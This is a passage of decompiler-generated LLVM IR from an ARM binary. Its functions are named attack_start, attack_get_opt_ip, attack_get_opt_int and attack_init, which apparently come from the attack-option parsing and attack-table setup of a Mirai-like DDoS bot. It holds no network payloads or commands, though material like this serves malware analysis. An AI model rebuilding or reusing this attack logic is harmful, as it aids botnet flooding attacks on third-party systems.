  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_12a54.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_12a54.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_218b4.29 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_218b8.31 to i32), i32* @r6, align 4
  store i32 36588, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_218b5.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_218b8.31, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 36588, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 36588, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_218b5.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_218b5.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_218b8.31, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_a088.39 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
